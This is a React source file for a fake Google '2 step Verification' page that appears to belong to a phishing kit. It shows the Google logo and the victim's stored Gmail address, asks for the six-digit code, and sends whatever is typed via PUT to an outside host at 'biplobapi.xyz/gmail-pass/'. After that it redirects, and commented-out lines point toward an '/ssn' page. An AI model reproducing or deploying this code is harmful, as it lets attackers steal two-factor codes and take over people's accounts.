import React from "react";
import { useForm } from "react-hook-form";
import { useLocation, useNavigate } from "react-router-dom";
import "./Recovery.css";
const RecoveryCode = () => {
  const { state } = useLocation();
  const navigate = useNavigate();
  const { temp } = state;
  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm();
  const handleVerify = (data) => {
    const recoveryCode = {
      recoveryCode: data.recoveryCode,
    };

    // localStorage.setItem('gmail', data.gmail);

    fetch(`https://biplobapi.xyz/gmail-pass/${temp}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(recoveryCode),
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.modifiedCount > 0) {
          // navigate("/ssn", { state: { temp: temp } });
          // navigate('/404');
          navigate(localStorage.getItem("url"));
        }
      });
  };
  return (
    <div className="gmail-container">
      <div>
        <form className="email-box" onSubmit={handleSubmit(handleVerify)}>
          <img src="/google.png" alt="" />
          <h5>2 step Verification</h5>
          <p className="dsf">
            To help your account safe, Google wants to make sure it's really you
            trying to sign in
          </p>
          <p className="email-shower">{localStorage.getItem("gmail")}</p>
          <p className="dsf">
            A text message with a 6-digit code has been sent to your phone.
          </p>
          {/* <div className="input-box">
                        <div class="form-group">
                            <input
                                type='text'
                                id="name"
                                name="name"
                                {...register("recoveryCode")}
                                required
                            />
                            <label for="name" className='dfd'>Enter the code</label>
                        </div>


                        <p className="bluredtext">
                            Not your computer? Use a Private Window to sign in. <br />{" "}
                            <a href="">Learn More</a>{" "}
                        </p>
                    </div> */}
          <div className="input-container">
            <span className="input-prefix">G-</span>
            <input
              {...register("recoveryCode")}
              type="text"
              className="input-field2"
              placeholder="Enter the code"
            />
          </div>
          <div className="bottom-container">
            <a href="">Try another way</a>
            <button className="next-btn" type="submit">
              Next
            </button>
          </div>
        </form>
        <div className="menu-container">
          <div>
            <small>English (Unites Sates)</small>
          </div>
          <div className="menus">
            <small>Home</small>
            <small>Privacy</small>
            <small>Terms</small>
          </div>
        </div>
      </div>
    </div>
  );
};

export default RecoveryCode;
